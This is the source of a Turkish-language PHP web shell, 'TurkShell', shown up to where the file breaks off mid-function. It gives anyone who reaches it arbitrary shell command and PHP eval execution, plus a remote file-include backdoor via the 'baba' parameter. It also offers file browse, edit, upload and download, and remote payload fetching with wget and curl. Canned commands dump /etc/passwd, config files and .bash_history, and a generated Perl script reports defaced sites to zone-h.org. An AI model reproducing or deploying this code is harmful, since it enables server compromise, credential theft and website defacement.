<?php
/*###########################################
Shell
Bu Shell kodların derlemesi Megabros tarafından yapılmıştır..
Yapımcı Ve derleyeN : Megabros
###########################################*/
error_reporting(0);
set_magic_quotes_runtime(0);

if (-1 == version_compare(phpversion(), '4.1.0')) {
    $_POST = &$HTTP_POST_VARS;
    $_GET = &$HTTP_GET_VARS;
    $_SERVER = &$HTTP_SERVER_VARS;
}function inclink($link, $val)
{
    $requ = $_SERVER['REQUEST_URI'];
    if (strstr($requ, $link)) {
        return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/", "$link=$val", $requ);
    } elseif (strstr($requ, 'showsc')) {
        return preg_replace('/showsc=[\\d\\w\\W\\D\\S]*/', "$link=$val", $requ);
    } elseif (strstr($requ, 'hlp')) {
        return preg_replace('/hlp=[\\d\\w\\W\\D\\S]*/', "$link=$val", $requ);
    } elseif (strstr($requ, '?')) {
        return $requ . '&' . $link . '=' . $val;
    } else {
        return $requ . '?' . $link . '=' . $val;
    }
}
function delm($delmtxt)
{
    echo"<center><table bgcolor=Maroon  style='border:1px red  ' width=99% height=2%>";
    echo"<tr><td><b><center><font size=3 color=red >$delmtxt</td></tr></table></center>";
}
function callfuncs($cmnd)
{
    if (function_exists(shell_exec)) {
        $scmd = shell_exec($cmnd);
        $nscmd = htmlspecialchars($scmd);
        echo $nscmd;
    } elseif (!function_exists(shell_exec)) {
        exec($cmnd, $ecmd);
        $ecmd = join("\n", $ecmd);
        $necmd = htmlspecialchars($ecmd);
        echo $necmd;
    } elseif (!function_exists(exec)) {
        $pcmd = popen($cmnd, 'r');
        while (!feof($pcmd)) {
            $res = htmlspecialchars(fgetc($pcmd));

            echo $res;
        }
        pclose($pcmd);
    } elseif (!function_exists(popen)) {
        ob_start();
        system($cmnd);
        $sret = ob_get_contents();
        ob_clean();
        echo htmlspecialchars($sret);
    } elseif (!function_exists(system)) {
        ob_start();
        passthru($cmnd);
        $pret = ob_get_contents();
        ob_clean();
        echo htmlspecialchars($pret);
    }
}
function input($type, $name, $value, $size)
{
    if (empty($value)) {
        echo "<input type=$type name=$name size=$size>";
    } elseif (empty($name) && empty($size)) {
        echo "<input type=$type value=$value >";
    } elseif (empty($size)) {
        echo "<input type=$type name=$name value=$value >";
    } else {
        echo "<input type=$type name=$name value=$value size=$size >";
    }
}
function permcol($path)
{
    if (is_writable($path)) {
        echo '<font color=red>';
        callperms($path);
        echo '</font>';
    } elseif (!is_readable($path) && !is_writable($path)) {
        echo '<font color=red  >';
        callperms($path);
        echo '</font>';
    } else {
        echo '<font color=red >';
        callperms($path);
    }
}
if ('dwld' == $dlink) {
    download($_REQUEST['dwld']);
}
function download($dwfile)
{
    $size = filesize($dwfile);
    @header("Content-Type: application/force-download;name=$dwfile");
    @header('Content-Transfer-Encoding: binary');
    @header("Content-Length: $size");
    @header("Content-Disposition: attachment; filename=$dwfile");
    @header('Expires: 0');
    @header('Cache-Control: no-cache, must-revalidate');
    @header('Pragma: no-cache');
    @readfile($dwfile);
    exit;
}
?>

<?php include $_GET['baba']; ?>
<html> 
<head><title>Wardom | Ne Mutlu Türk'üm Diyene! | Edited By KingDefacer</title></head>
<style> 
BODY { SCROLLBAR-BASE-COLOR: darkred ; SCROLLBAR-ARROW-COLOR: red; } 
a{color:#FF0000;text-decoration:none;font-family:tahoma;font-size:13px}
a:hover{color:red}
input{FONT-WEIGHT:normal;background-color: #FFFFFF;font-size: 12px; color: #FF0000; font-family: Tahoma; border: 1px solid #666666;height:17}
textarea{background-color:#FFFFFF;color:#FF0000;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #FF0000;}
div{font-size:12px;font-family:tahoma;font-weight:normal;color:red  smoke}
select{background-color: #FFFFFF; font-size: 12px; color: #FF0000; font-family: Tahoma; border: 1 solid #666666;font-weight:bold;}</style> 
<body bgcolor=DarkRed text=white ><font face="sans ms" size=3>
</body> 
</html> 
<?php
$nscdir = (!isset($_REQUEST['scdir'])) ? getcwd() : chdir($_REQUEST['scdir']); $nscdir = getcwd();

$sf = '<form method=post>'; $ef = '</form>';
$st = '<table style="border:1px #FF0000 solid " width=100% height=100%>';
$et = '</table>'; $c1 = '<tr><td height=22% style="border:1px #FF0000 solid ">';
$c2 = '<tr><td style="border:1px #FF0000 solid ">'; $ec = '</tr></td>';
$sta = '<textarea cols=157 rows=23>'; $eta = '</textarea>';
$sfnt = '<font face=tahoma size=2 color=red  >'; $efnt = '</font>';
//################ Ending of common variables ########################

//header table 1
echo'<table bgcolor=#191919 style="border:2px #FF0000 solid " width=100% height=%>'; echo'<tr><td>'; echo'<b>
<center><font face=Wingdings color=#FFFFFF size=7> Z</font><font face=tahoma color=red size=7> TÜRK <font face=tahoma color=white size=7> SHELL
</font></font> <font face=Wingdings color=red size=7> F</font><font face=Wingdings color=red size=8>N
</font></b></center>'; echo'</td></tr>'; echo'</table>'; echo '<br>';

//header table 2
echo'<table bgcolor=#191919 style="border:2px #FF0000 solid " width=100% height=%>'; echo'<tr><td>'; echo'<center><div><b>';

//start header2 links
//home
echo '<a href=' . inclink('dlink', 'home') . '>AnaSayfa</a>';
//go back
echo " - <a href='javascript:history.back()'>Geri</a>";
//php info1
echo " - <a target='_blank' href=" . inclink('dlink', 'phpinfo') . '>Php Bilgi</a>';
//phpinfo2
if ('phpinfo' == $dlink) {
    echo phpinfo();
    die();
}
//base64 decode1
echo ' - <a href=' . inclink('dlink', 'basepw') . '>Base64 Çözücü</a>';
//url decode1
echo ' - <a href=' . inclink('dlink', 'urld') . '>Url Kod Çözücü</a>';
//url encode1
echo ' - <a href=' . inclink('dlink', 'urlen') . '>Url Kodlayıcı</a>';
//MD51
echo ' - <a href=' . inclink('dlink', 'mdf') . '>Md5</a>';
//permission check1
echo ' - <a href=' . inclink('dlink', 'perm') . "&scdir=$nscdir>İzinler</a>";
//show file source
echo ' - <a href=' . inclink('dlink', 'showsrc') . "&scdir=$nscdir>Dosya Kaynağı</a>";
//quick index1
echo ' - <a href=' . inclink('dlink', 'qindx') . "&scdir=$nscdir>İndex Hazırla</a>";
//send mail
echo ' - <a href=' . inclink('dlink', 'mail') . "&scdir=$nscdir>Mail</a>";
//Command helper
echo ' - <a href=' . inclink('dlink', 'cmdhlp') . "&scdir=$nscdir>Cmd Yardım</a>";
//end of links

//base64 decode2
if (isset($_REQUEST['ncbase'])) {
    $cbase = (base64_decode($_REQUEST['ncbase']));
    echo "<p>Result is : $sfnt" . $cbase . "$efnt";
    die();
}
if ('basepw' == $dlink) {
    echo '<p><b>[ Base64 - Çözücü ]</b>';
    echo $sf;
    input('text', 'ncbase', $ncbase, 35);
    echo ' ';
    input('submit', '', 'Çöz', '');
    echo $ef;
    die();
}

//url decode2
if (isset($_REQUEST['nurld'])) {
    $urldc = (urldecode($_REQUEST['nurld']));
    echo "<p>Result is : $sfnt" . $urldc . "$efnt";
    die();
}
if ('urld' == $dlink) {
    echo '<p><b>[ Url - Çözücü ]</b>';
    echo $sf;
    input('text', 'nurld', $nurld, 35);
    echo ' ';
    input('submit', '', 'Çöz', '');
    echo $ef;
    die();
}

//url encode2
if (isset($_REQUEST['nurlen'])) {
    $urlenc = (urlencode(stripslashes($_REQUEST['nurlen'])));
    echo "<p>Result is : $sfnt" . $urlenc . "$efnt";
    die();
}
if ('urlen' == $dlink) {
    echo '<p><b>[ Url - Şifreleme ]</b>';
    echo $sf;
    input('text', 'nurlen', $nurlen, 35);
    echo ' ';
    input('submit', '', 'Şifrele', '');
    echo $ef;
    die();
}

//MD52
if (isset($_REQUEST['nmdf'])) {
    $mdfe = (md5($_REQUEST['nmdf']));
    echo "<p>Result is : $sfnt" . $mdfe . "$efnt";
    die();
}
if ('mdf' == $dlink) {
    echo '<p><b>[ MD5 - Şifreleme ]</b>';
    echo $sf;
    input('text', 'nmdf', $nmdf, 35);
    echo ' ';
    input('hidden', 'scdir', $scdir, 22);
    input('submit', '', 'Şifrele', '');
    echo $ef;
    die();
}

//chk permission2
if ('perm' == $dlink) {
    echo $sf;
    input('submit', 'mfldr', 'Ana-Klasör', '');
    echo ' ';
    input('submit', 'sfldr', 'Alt-Klasör', '');
    echo $ef;

    echo '<pre>';
    echo '<p><textarea cols=120 rows=12>';
    if (isset($_REQUEST['mfldr'])) {
        callfuncs('find . -type d -perm -2 -ls');
    } elseif (isset($_REQUEST['sfldr'])) {
        callfuncs('find ../ -type d -perm -2 -ls');
    }
    echo '</textarea>';
    echo '</pre>';
    die();
}
//show file sources
function callshsrc($showsc)
{
    if (isset($showsc) && '0' == filesize($showsc)) {
        echo '<p><b>[ Sorry, U choosed an empty file or the file not exists ]';
        die();
    } elseif (isset($showsc) && '0' !== filesize($showsc)) {
        echo '<p><table width=100% height=10% bgcolor=#FF0000 border=1><tr><td>';
        if (!show_source($showsc) || !function_exists('show_source')) {
            echo "<center><font color=white size=2><b>[ Sorry can't complete the operation ]</font></center>";
            die();
        }
        echo '</td></tr></table>';
        die();
    }
} if ('showsrc' == $dlink) {
    echo '<p><b>: TurkShell Php editörüyle istediğiniz bir php dosyasını görüntüleyebilmek için, dosya adını bütün dizinleriyle beraber yazınız. :';
    echo '<form method=get>';
    input('text', 'showsc', '', 35);
    echo ' ';
    input('hidden', 'scdir', $scdir, 22);
    input('submit', 'subshsc', 'Görüntüle', '');
    echo $ef;
    die();
} if (isset($_REQUEST['showsc'])) {
    callshsrc(trim($_REQUEST['showsc']));
}
if ('cmdhlp' == $dlink) {
    echo '<p><b>: Komutu Aşağıya Ekle ve Biz Ne İşe Yaradığı Hakkında Yardımcı Olalım :';
    echo '<form method=get>';
    input('text', 'hlp', '', 35);
    echo ' ';
    input('submit', '', 'Yardım', '');
    echo $ef;
    die();
}
if (isset($_REQUEST['hlp'])) {
    $hlp = $_REQUEST['hlp'];
    echo "<p><b>[ Yazılan Komut: $sfnt" . $hlp . "$efnt ]";
    $hlp = escapeshellcmd($hlp);
    echo '<p><table width=100% height=30% bgcolor=#FF0000 border=2><tr><td>';
    if (!function_exists(shell_exec) && !function_exists(exec) &&
!function_exists(popen) && !function_exists(system) && !function_exists(passthru)) {
        echo "<center><font color=white size=2><b>[ Sorry can't complete the operation ]</font></center>";
    } else {
        echo '<pre><font color=white>';
        if (!callfuncs("man $hlp | col -b")) {
            echo '<center><font size=2><b>[ Bitti. ]';
        }
        echo '</pre></font>';
    }
    echo '</td></tr></table>';
    die();
}
if (isset($_REQUEST['indx']) && !empty($_REQUEST['indxtxt'])) {
    if (true == touch($_REQUEST['indx'])) {
        $fp = fopen($_REQUEST['indx'], 'w+');
        fwrite($fp, stripslashes($_REQUEST['indxtxt']));
        fclose($fp);
        echo "<p>[ $sfnt" . $_REQUEST['indx'] . "$efnt created successfully !! ]</p>";
        echo "<b><center>[ <a href='javascript:history.back()'>Yeniden Editle</a>
] -- [<a href=" . inclink('dlink', 'scurrdir') . "&scdir=$nscdir> Curr-Dir </a>]</center></b>";
        die();
    } else {
        echo "<p>[ Sorry, Can't create the index !! ]</p>";
        die();
    }
}
if ('qindx' == $dlink && !isset($_REQUEST['qindsub'])) {
    echo $sf . '<br>';
    echo '<p><textarea cols=50 rows=10 name=indxtxt>
İndex kodlarını buraya yaz</textarea></p>';
    input('text', 'indx', 'İndex Adı', 35);
    echo ' ';
    input('submit', 'qindsub', 'Oluştur', '');
    echo $ef;
    die();
}
if (isset($_REQUEST['mailsub']) && !empty($_REQUEST['mailto'])) {
    $mailto = $_REQUEST['mailto'];
    $subj = $_REQUEST['subj'];
    $mailtxt = $_REQUEST['mailtxt'];
    if (mail($mailto, $subj, $mailtxt)) {
        echo "<p>[ Mail sended to $sfnt" . $mailto . " $efnt successfully ]</p>";
        die();
    } else {
        echo "<p>[ Error, Can't send the mail ]</p>";
        die();
    }
} elseif (isset($mailsub) && empty($mailto)) {
    echo "<p>[ Error, Can't send the mail ]</p>";
    die();
}
if ('mail' == $dlink && !isset($_REQUEST['mailsub'])) {
    echo $sf . '<br>';
    echo '<p><textarea cols=50 rows=10 name=mailtxt>
Mesajını buraya yaz</textarea></p>';
    input('text', 'mailto', 'mail adresi', 35);
    echo ' ';
    input('text', 'subj', 'Başlık', 20);
    echo ' ';
    input('submit', 'mailsub', 'Gönder', '');
    echo $ef;
    die();
}
if (isset($_REQUEST['zonet']) && !empty($_REQUEST['zonet'])) {
    callzone($nscdir);
}
function callzone($nscdir)
{
    if (is_writable($nscdir)) {
        $fpz = fopen('z.pl', 'w');
        $zpl = 'z.pl';
        $li = 'bklist.txt';
    } else {
        $fpz = fopen('/tmp/z.pl', 'w');
        $zpl = '/tmp/z.pl';
        $li = '/tmp/bklist.txt';
    }
    fwrite($fpz, "\$arq = @ARGV[0];
\$grupo = @ARGV[1];
chomp \$grupo;
open(a,\"<\$arq\");
@site = <a>;
close(a);
\$b = scalar(@site);
for(\$a=0;\$a<=\$b;\$a++)
{chomp \$site[\$a];
if(\$site[\$a] =~ /http/) { substr(\$site[\$a], 0, 7) =\"\"; }
print \"[+] Sending \$site[\$a]\n\";
use IO::Socket::INET;
\$sock = IO::Socket::INET->new(PeerAddr => \"old.zone-h.org\", PeerPort => 80, Proto => \"tcp\") or next;
print \$sock \"POST /en/defacements/notify HTTP/1.0\r\n\";
print \$sock \"Accept: */*\r\n\";
print \$sock \"Referer: http://old.zone-h.org/en/defacements/notify\r\n\";
print \$sock \"Accept-Language: pt-br\r\n\";
print \$sock \"Content-Type: application/x-www-form-urlencoded\r\n\";
print \$sock \"Connection: Keep-Alive\r\n\";
print \$sock \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n\";
print \$sock \"Host: old.zone-h.org\r\n\";
print \$sock \"Content-Length: 385\r\n\";
print \$sock \"Pragma: no-cache\r\n\";
print \$sock \"\r\n\";
print \$sock \"notify_defacer=\$grupo&notify_domain=http%3A%2F%2F\$site[\$a]&notify_hackmode=22&notify_reason=5&notify=+OK+\r\n\";
close(\$sock);}");
    if (true == touch($li)) {
        $fpl = fopen($li, 'w+');
        fwrite($fpl, $_REQUEST['zonetxt']);
    } else {
        echo "<p>[ Can't complete the operation, try change the current dir with writable one ]<br>";
    }
    $zonet = $_REQUEST['zonet'];
    if (!function_exists(exec) && !function_exists(shell_exec) && !function_exists(popen) && !function_exists(system) && !function_exists(passthru)) {
        echo "[ Can't complete the operation !! ]";
    } else {
        callfuncs("chmod 777 $zpl;chmod 777 $li");
        ob_start();
        callfuncs("perl $zpl $li $zonet");
        ob_clean();
        echo '<p>[ All sites should be sended to zone-h.org successfully !! ]';
        die();
    }
} if ('zone' == $dlink && !isset($_REQUEST['zonesub'])) {
    echo $sf . '<br>';
    echo '<p><pre><textarea cols=50 rows=10 name=zonetxt>
www.site1.com
www.site2.com
</textarea></pre></p>';
    input('text', 'zonet', 'Hacker-name', 35);
    echo ' ';
    input('submit', 'zonesub', 'Send', '');
    echo $ef;
    die();
}
echo '</div></b></center>'; echo'</td></tr>'; echo'</table>'; echo '<br>';
function inisaf($iniv)
{
    $chkini = ini_get($iniv);
    if ('on' !== ($chkini || strtolower($chkini))) {
        echo'<font color=red ><b>Safe Mod Kapalı Gözüküyor. Ancak Engelli Fonksiyonlar Bulunabilir.</b></font>';
    } else {
        echo'<font color=red><b>Açık ( Güvenli )</b></font>';
    }
}function inifunc($inif)
{
    $chkin = ini_get($inif);
    if ('' == $chkin) {
        echo ' <font color=red><b>Yok</b></font>';
    } else {
        $nchkin = wordwrap($chkin, 40, "\n", 1);
        echo '<b><font color=red  >' . $nchkin . '</font></b>';
    }
}function callocmd($ocmd, $owhich)
{
    if (function_exists(exec)) {
        $nval = exec($ocmd);
    } elseif (!function_exists(exec)) {
        $nval = shell_exec($ocmd);
    } elseif (!function_exists(shell_exec)) {
        $opop = popen($ocmd, 'r');
        while (!feof($opop)) {
            $nval = fgetc($opop);
        }
    } elseif (!function_exists(popen)) {
        ob_start();
        system($ocmd);
        $nval = ob_get_contents();
        ob_clean();
    } elseif (!function_exists(system)) {
        ob_start();
        passthru($ocmd);
        $nval = ob_get_contents();
        ob_clean();
    }
    if ($nval = $owhich) {
        echo'<font color=red><b>ON</b></font>';
    } else {
        echo'<font color=red  ><b>OFF</b></font>';
    }
}
echo'<table bgcolor=#191919 style="border:2px #FF0000 solid ;font-size:13px;font-family:tahoma " width=100% height=%>';
echo'<tr><td>'; echo'<center><br>';
echo"<b>Safe-mode :\t"; echo inisaf('safe_mode'); echo '</b>'; echo'</center>';
if (!function_exists(exec) && !function_exists(shell_exec) && !function_exists(popen) && !function_exists(system) && !function_exists(passthru) || strstr(PHP_OS, 'WIN')) {
    echo '';
} else {
    echo "<table bgcolor=#191919 width=100% height=% style='font-size:13px;font-family:tahoma'><tr><td>";
    echo '<div align=center>';
    echo'<br><b>Mysql : </b>';
    callocmd('which mysql', '/usr/bin/mysql');
    echo'</td>';
    echo'<td>';
    echo'<br><b>Perl : </b>';
    callocmd('which perl', ('/usr/bin/perl') || '/usr/local/bin/perl');
    echo'</td>';
    echo'<td>';
    echo'<br><b>Gcc : </b>';
    callocmd('which gcc', '/usr/bin/gcc');
    echo'</td>';
    echo'<td>';
    echo'<br><b>Curl : </b>';
    callocmd('which curl', '/usr/bin/curl');
    echo'</td>';
    echo'<td>';
    echo'<br><b>GET : </b>';
    callocmd('which GET', '/usr/bin/GET');
    echo'</td>';
    echo'<td>';
    echo'<br><b>Wget : </b>';
    callocmd('which wget', '/usr/bin/wget');
    echo'</td>';
    echo'<td>';
    echo'<br><b>Lynx : </b>';
    callocmd('which lynx', '/usr/bin/lynx');
    echo'</td>';
    echo '</tr></table>';
}echo '<hr><br>';
echo '<br><table  style="border:2px #FF0000 solid " width=100% height=%>'; echo'<tr><td><font size=2 face=tahoma>';
echo '<b>IP Numaranız : ' . $REMOTE_ADDR . '<br></b>';
echo '<b>Server IP Numarası : ' . $SERVER_ADDR . '</b>';
echo'<br><b>' . $SERVER_SIGNATURE . '</b>';
echo '<b>Server Adı : ' . $SERVER_NAME . ' / ' . 'Email : ' . $SERVER_ADMIN . '<br></b>';
echo '<b>Engelli Fonksiyonlar : </b>'; inifunc(disable_functions); echo'<br>';
echo '<b>Kimsiniz : <b>'; callfuncs('id'); echo'<br><b>Os : </b>';
if (strstr(PHP_OS, 'WIN')) {
    echo php_uname();
    echo ' ';
    echo PHP_OS;
} else {
    if (!function_exists(shell_exec) && !function_exists(exec) &&
!function_exists(popen) && !function_exists(system) && !function_exists(passthru)) {
        echo php_uname();
        echo '/';
        echo PHP_OS;
    } else {
        callfuncs('uname -a');
    }
}echo'<br>';
echo'Php-versiyon : ' . phpversion(); echo'<br><b>Bulunduğunuz Ana Dizin : </b>';
echo $nscdir . '&nbsp;&nbsp;&nbsp;&nbsp; [ '; permcol($nscdir); echo ' ]';
echo'<br>'; echo 'TurkShell Burada : ' . __FILE__;
echo'<br> Toplam Alan: '; readable_size(disk_total_space($nscdir)); echo ' / ';
echo'Bos Alan: '; readable_size(disk_free_space($nscdir));
echo '</center><br></font>'; echo'</td></tr></table><br>';
if (isset($_REQUEST['credir'])) {
    $ndir = trim($_REQUEST['dir']);
    if (mkdir($ndir, 0777)) {
        $mess = basename($ndir) . ' created successfully';
    } else {
        $mess = 'Klasör Oluştur/Sil';
    }
} elseif (isset($_REQUEST['deldir'])) {
    $nrm = trim($_REQUEST['dir']);
    if (is_dir($nrm) && rmdir($nrm)) {
        $mess = basename($nrm) . ' deleted successfully';
    } else {
        $mess = 'Create/Delete Dir';
    }
} else {
    $mess = 'Klasör Olustur/Sil';
} if (isset($_REQUEST['crefile'])) {
    $ncfile = trim($_REQUEST['cfile']);
    if (!is_file($ncfile) && touch($ncfile)) {
        $mess3 = basename($ncfile) . ' created succefully';
        unset($_REQUEST['cfile']);
    } else {
        $mess3 = 'Dosya Olustur/Sil';
    }
} elseif (isset($_REQUEST['delfile'])) {
    $ndfile = trim($_REQUEST['cfile']);
    if (unlink($ndfile)) {
        $mess3 = basename($ndfile) . ' deleted succefully';
    } else {
        $mess3 = 'Dosya Olustur/Sil';
    }
} else {
    $mess3 = 'Dosya Olustur/Sil';
}
class upload
{
    public function upload($file, $tmp)
    {
        $nscdir = (!isset($_REQUEST['scdir'])) ? getcwd() : chdir($_REQUEST['scdir']);
        $nscdir = getcwd();
        if (isset($_REQUEST['up'])) {
            if (empty($upfile)) {
                echo '';
            }
            if (@copy($tmp, $nscdir . '/' . $file)) {
                echo "<div><center><b><font color=red  > $file </font>dosyası başarıyla yüklenmiştir.</b></center></div>";
            } else {
                echo "<center><b>: Error uploading<font color=red> $file </font>: </b></center>";
            }
        }
    }
}
$obj = new upload($HTTP_POST_FILES['upfile']['name'], $HTTP_POST_FILES['upfile']['tmp_name']); if (isset($_REQUEST['ustsub'])) {
    $ustname = trim($_REQUEST['ustname']);
    ob_start();
    if ($_REQUEST['ustools'] = 't1') {
        callfuncs('wget ' . $ustname);
    }
    if ($_REQUEST['ustools'] = 't2') {
        callfuncs('curl -o basename($ustname) $ustname');
    }
    if ($_REQUEST['ustools'] = 't3') {
        callfuncs('lynx -source $ustname > basename($ustname)');
    }
    if ($_REQUEST['ustools'] = 't9') {
        callfuncs('GET $ustname > basename($ustname)');
    }
    if ($_REQUEST['ustools'] = 't4') {
        callfuncs('unzip ' . $ustname);
    }
    if ($_REQUEST['ustools'] = 't5') {
        callfuncs('tar -xvf ' . $ustname);
    }
    if ($_REQUEST['ustools'] = 't6') {
        callfuncs('tar -zxvf ' . $ustname);
    }
    if ($_REQUEST['ustools'] = 't7') {
        callfuncs('chmod 777 ' . $ustname);
    }
    if ($_REQUEST['ustools'] = 't8') {
        callfuncs('make ' . $ustname);
    }
    ob_clean();
}
if (!isset($_REQUEST['cmd']) && !isset($_REQUEST['eval']) && !isset($_REQUEST['rfile']) && !isset($_REQUEST['edit']) && !isset($_REQUEST['subqcmnds']) && !isset($_REQUEST['safefile']) && !isset($_REQUEST['inifile']) && !isset($_REQUEST['bip']) &&
!isset($_REQUEST['rfiletxt'])) {
    if ($dh = dir($nscdir)) {
        while (true == ($filename = $dh->read())) {
            $files[] = $filename;
            sort($files);
        }
        echo '<br>';
        echo'<center><table bgcolor=#2A2A2A style="border:1px solid white" width=100% height=6% ></center>';
        echo '<tr><td width=43% style="border:1px solid white">';
        echo '<center><b>Dosyalar';
        echo '</td>';
        echo '<td width=8% style="border:1px solid white">';
        echo '<center><b>Boyutlar';
        echo '</td>';
        echo '<td width=3% style="border:1px solid white">';
        echo '<center><b>Yazma';
        echo '</td>';
        echo '<td width=3% style="border:1px solid white">';
        echo '<center><b>Okuma';
        echo '</td>';
        echo '<td width=5% style="border:1px solid white">';
        echo '<center><b>Tür';
        echo '</td>';
        echo '<td width=5% style="border:1px solid white">';
        echo '<center><b>Düzenleme';
        echo '</td>';
        echo '<td width=5% style="border:1px solid white">';
        echo '<center><b>Adlandırma';
        echo '</td>';
        echo '<td width=6% style="border:1px solid white">';
        echo '<center><b>İndir';
        echo '</td>';
        if (strstr(PHP_OS, 'Linux')) {
            echo '<td width=8% style="border:1px solid white">';
            echo '<center><b>Grup';
            echo '</td>';
        }
        echo '<td width=8% style="border:1px solid white">';
        echo '<center><b>İzinler';
        echo '</td></tr>';
        foreach ($files as $nfiles) {
            if (is_file("$nscdir/$nfiles")) {
                $scmess1 = filesize("$nscdir/$nfiles");
            }
            if (is_writable("$nscdir/$nfiles")) {
                $scmess2 = '<center><font color=red  >Evet';
            } else {
                $scmess2 = '<center><font color=red>Hayir';
            }
            if (is_readable("$nscdir/$nfiles")) {
                $scmess3 = '<center><font color=red  >Evet';
            } else {
                $scmess3 = '<center><font color=red>Hayir';
            }
            if (is_dir("$nscdir/$nfiles")) {
                $scmess4 = '<font color=red><center>Klasör';
            } else {
                $scmess4 = '<center><font color=red  >Dosya';
            }
            echo'<tr><td style="border:1px solid white">';
            if (is_dir($nfiles)) {
                echo "<font face= tahoma size=2 color=red  >[ $nfiles    ]<br>";
            } else {
                echo "<font face= tahoma size=2 color=#FF0000>$nfiles <br>";
            }
            echo'</td>';
            echo '<td style="border:1px solid white">';
            echo '<center><font face= tahoma size=2 color=#FF0000>';
            if (is_dir("$nscdir/$nfiles")) {
                echo '<b>K</b>lasör';
            } elseif (is_file("$nscdir/$nfiles")) {
                readable_size($scmess1);
            } else {
                echo '---';
            }
            echo '</td>';
            echo '<td style="border:1px solid white">';
            echo "<center><font face= tahoma size=2 >$scmess2";
            echo '</td>';
            echo'<td style="border:1px solid white">';
            echo "<center><font face= tahoma size=2 >$scmess3";
            echo '</td>';
            echo '<td style="border:1px solid white">';
            echo "<center><font face= tahoma size=2 >$scmess4";
            echo'</td>';
            echo '<td style="border:1px solid white">';
            if (is_file("$nscdir/$nfiles")) {
                echo ' <center><a href=' . inclink('dlink', 'edit') . "&edit=$nfiles&scdir=$nscdir>Düzenle</a>";
            } else {
                echo '<center><font face=tahoma size=2 color=gray>Düzenle</center>';
            }
            echo'</td>';
            echo '<td style="border:1px solid white">';
            echo ' <center><a href=' . inclink('dlink', 'ren') . "&ren=$nfiles&scdir=$nscdir>Adlandir</a>";
            echo'</td>';
            echo '<td style="border:1px solid white">';
            if (is_file("$nscdir/$nfiles")) {
                echo ' <center><a href=' . inclink('dlink', 'dwld') . "&dwld=$nfiles&scdir=$nscdir>indir</a>";
            } else {
                echo '<center><font face=tahoma size=2 color=gray>indir</center>';
            }
            echo'</td>';
            if (strstr(PHP_OS, 'Linux')) {
                echo '<td style="border:1px solid white">';
                echo '<center><font face=tahoma size=2 color=#FF0000>';
                owgr($nfiles);
                echo '</center>';
                echo'</td>';
            }
            echo '<td style="border:1px solid red  ">';
            echo '<center><div>';
            permcol("$nscdir/$nfiles");
            echo '</div>';
            echo'</td>';
            echo '</tr>';
        }
        echo '</table>';
        echo '<br>';
    } else {
        echo '<div><br><center><b>[ İzin Verilmiyor. ]<p>';
    }
} elseif (!isset($_REQUEST['rfile']) && isset($_REQUEST['cmd']) || isset($_REQUEST['eval']) || isset($_REQUEST['subqcmnds'])) {
    if (!isset($_REQUEST['rfile']) && isset($_REQUEST['cmd'])) {
        echo '<div><b><center>[ Executed command ][$] : ' . $_REQUEST['cmd'] . '</div></center>';
    }
    echo '<pre><center>' . $sta;
    if (isset($_REQUEST['cmd'])) {
        $cmd = trim($_REQUEST['cmd']);
        callfuncs($cmd);
    } elseif (isset($_REQUEST['eval'])) {
        ob_start();
        eval(stripslashes(trim($_REQUEST['eval'])));
        $ret = ob_get_contents();
        ob_clean();
        echo htmlspecialchars($ret);
    } elseif (isset($_REQUEST['subqcmnds'])) {
        if ('op1' == $_REQUEST['uscmnds']) {
            callfuncs('ls -lia');
        }
        if ('op2' == $_REQUEST['uscmnds']) {
            callfuncs('cat /etc/passwd');
        }
        if ('op3' == $_REQUEST['uscmnds']) {
            callfuncs('cat /var/cpanel/accounting.log');
        }
        if ('op4' == $_REQUEST['uscmnds']) {
            callfuncs('ls /var/named');
        }
        if ('op11' == $_REQUEST['uscmnds']) {
            callfuncs('find ../ -type d -perm -2 -ls');
        }
        if ('op12' == $_REQUEST['uscmnds']) {
            callfuncs('find ./ -type d -perm -2 -ls');
        }
        if ('op5' == $_REQUEST['uscmnds']) {
            callfuncs('find ./ -name service.pwd ');
        }
        if ('op6' == $_REQUEST['uscmnds']) {
            callfuncs('find ./ -name config.php');
        }
        if ('op7' == $_REQUEST['uscmnds']) {
            callfuncs('find / -type f -name .bash_history');
        }
        if ('op8' == $_REQUEST['uscmnds']) {
            callfuncs('cat /etc/hosts');
        }
        if ('op9' == $_REQUEST['uscmnds']) {
            callfuncs('finger root');
        }
        if ('op10' == $_REQUEST['uscmnds']) {
            callfuncs('netstat -an | grep -i listen');
        }
        if ('op13' == $_REQUEST['uscmnds']) {
            callfuncs('cat /etc/services');
        }
    }
    echo $eta . '</center></pre>';
}
function rdread($nscdir, $sf, $ef)
{
    $rfile = trim($_REQUEST['rfile']);
    if (is_readable($rfile) && is_file($rfile)) {
        $fp = fopen($rfile, 'r');
        echo'<center>';
        echo '<div><b>[ Editing <font color=red  >' . basename($rfile) . "</font> ] [<a href='javascript:history.back()'> Geri </a>] [<a href=" . inclink('dlink', 'rdcurrdir') . "&scdir=$nscdir> Curr-Dir </a>]</b></div><br>";
        echo $sf . '<textarea cols=157 rows=23 name=rfiletxt>';
        while (!feof($fp)) {
            $lines = fgetc($fp);
            $nlines = htmlspecialchars($lines);
            echo $nlines;
        }
        fclose($fp);
        echo '</textarea>';
        if (is_writable($rfile)) {
            echo "<center><input type=hidden value=$rfile name=hidrfile><input type=submit value='Kaydet' > <input type=reset value='Reset' ></center>" . $ef;
        } else {
            echo "<div><b><center>[ Can't edit <font color=red  >" . basename($rfile) . '</font> ]</center></b></div><br>';
        }
        echo '</center><br>';
    } elseif (!file_exists($_REQUEST['rfile']) || !is_readable($_REQUEST['rfile']) || $_REQUEST['rfile'] = $nscdir) {
        echo '<div><b><center>[ Safe Mod kapalı olduğu halde, engelli fonksiyonlar bulunduğundan dolayı isteğinize cevap verilememektedir. ]</center></b></div><br>';
    }
}
function rdsave($nscdir)
{
    $hidrfile = trim($_REQUEST['hidrfile']);
    if (is_writable($hidrfile)) {
        $rffp = fopen($hidrfile, 'w+');
        $rfiletxt = stripslashes($_REQUEST['rfiletxt']);
        fwrite($rffp, $rfiletxt);
        echo '<div><b><center>
[ <font color=red >' . basename($hidrfile) . '</font> Başarıyla Düzenlendi. ]
[<a href=' . inclink('dlink', 'rdcurrdir') . "&scdir=$nscdir> Curr-Dir </a>] [<a href='javascript:history.back()'> Edit again </a>]
</center></b></div><br>";
        fclose($rffp);
    } else {
